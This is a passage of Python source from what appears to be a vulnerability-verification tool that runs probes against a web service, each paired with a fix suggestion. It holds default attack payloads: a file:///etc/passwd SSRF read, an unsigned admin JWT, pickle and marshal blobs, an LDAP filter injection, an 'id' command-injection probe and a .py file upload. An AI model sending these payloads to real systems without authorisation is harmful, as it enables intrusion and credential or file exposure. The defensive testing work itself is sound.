                "--parameter", strategy.get("parameter", "url"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "file:///etc/passwd"),
                "--expected", strategy.get("expected", "root:"),
            ],
            success_reason="Python SSRF probe observed server-side fetching of attacker-controlled targets",
            fail_reason="Python SSRF probe ran but did not confirm attacker-controlled server-side fetches",
            fix_suggestion="Apply allowlists for outbound targets and reject file, loopback, and internal network destinations before issuing requests",
        )

    def _verify_python_jwt_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="python_jwt_probe.py",
            poc_type="python-jwt",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "token"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJhMyI6IjQ5In0."),
                "--expected", strategy.get("expected", "admin"),
            ],
            success_reason="已通过 Python JWT 探测脚本观察到弱 JWT 被服务端接受",
            fail_reason="Python JWT 探测已执行，但未观察到预期 JWT 绕过结果",
            fix_suggestion="禁止关闭 JWT 签名校验，强制声明并校验允许算法列表",
        )

    def _verify_python_pickle_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="python_pickle_probe.py",
            poc_type="python-pickle",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "data"),
                "--method", strategy.get("method", "POST"),
                "--payload", strategy.get("payload", "gASVCQAAAAAAAAB9lIwCYTOUSzFzLg=="),
                "--expected", strategy.get("expected", "a3"),
                "--encoding", strategy.get("encoding", "base64"),
            ],
            success_reason="Python pickle 探测脚本已观察到危险反序列化输入被服务端处理",
            fail_reason="Python pickle 探测已执行，但未观察到预期反序列化结果",
            fix_suggestion="禁止对不可信输入调用 pickle.load/loads，优先使用 JSON 等安全格式",
        )

    def _verify_python_yaml_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="python_yaml_probe.py",
            poc_type="python-yaml",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "data"),
                "--method", strategy.get("method", "POST"),
                "--payload", strategy.get("payload", "a3: 49\nrole: admin\n"),
                "--expected", strategy.get("expected", "49"),
            ],
            success_reason="Python YAML 探测脚本已观察到危险 YAML 输入被服务端处理",
            fail_reason="Python YAML 探测已执行，但未观察到预期解析结果",
            fix_suggestion="使用 yaml.safe_load 或 SafeLoader，禁止将 HTTP 输入直接交给 yaml.load",
        )

    def _verify_python_ldap_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_ldap_probe.py",
            poc_type="python-ldap",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "username"),
                "--method", strategy.get("method", "GET"),
                "--baseline", strategy.get("baseline", "guest"),
                "--payload", strategy.get("payload", "*)(|(uid=*))"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="Python LDAP probe observed a meaningful difference between baseline and injected filters",
            fail_reason="Python LDAP probe ran but did not confirm LDAP injection success",
            fix_suggestion="Do not concatenate request input into LDAP filters; escape meta characters and use fixed filter templates",
        )

    def _verify_python_debug_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="python_debug_probe.py",
            poc_type="python-debug",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--method", strategy.get("method", "GET"),
                "--expected", strategy.get("expected", "Werkzeug"),
            ],
            success_reason="Python debug probe observed externally reachable debug or traceback markers",
            fail_reason="Python debug probe ran but did not confirm an exposed debug surface",
            fix_suggestion="Disable debug mode in deployed environments and never expose interactive traceback consoles to untrusted users",
        )

    def _verify_python_marshal_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="python_marshal_probe.py",
            poc_type="python-marshal",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "data"),
                "--method", strategy.get("method", "POST"),
                "--payload", strategy.get("payload", "2wIAAAB7uAIAAABhM+kxAAAA30A="),
                "--expected", strategy.get("expected", "a3"),
                "--encoding", strategy.get("encoding", "base64"),
            ],
            success_reason="Python marshal probe observed request-controlled marshal data being processed by the service",
            fail_reason="Python marshal probe ran but did not confirm unsafe marshal deserialization",
            fix_suggestion="Do not call marshal.load/loads on untrusted request data; switch to safe data formats such as JSON",
        )

    def _verify_python_command_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="python_command_exec_probe.py",
            poc_type="python-command-exec",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "cmd"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "id"),
                "--expected", strategy.get("expected", "uid="),
            ],
            success_reason="Python 命令执行探测脚本已观察到命令回显",
            fail_reason="Python 命令执行探测已执行，但未观察到预期命令回显",
            fix_suggestion="禁止将 HTTP 输入直接拼接到 os.system/subprocess(shell=True)，优先使用参数化命令",
        )

    def _verify_python_file_upload_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="python_file_upload_probe.py",
            poc_type="python-file-upload",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--field-name", strategy.get("field_name", "file"),
                "--filename", strategy.get("filename", "a3-test.py"),
                "--content", strategy.get("content", "print(49)"),
                "--expected", strategy.get("expected", "ok"),
            ],
            success_reason="已通过 Python 文件上传探测脚本观察到上传请求被服务端接收",
            fail_reason="Python 文件上传探测已执行，但未观察到预期上传结果",
            fix_suggestion="限制上传文件类型、扩展名和保存目录，并使用安全文件名",
        )


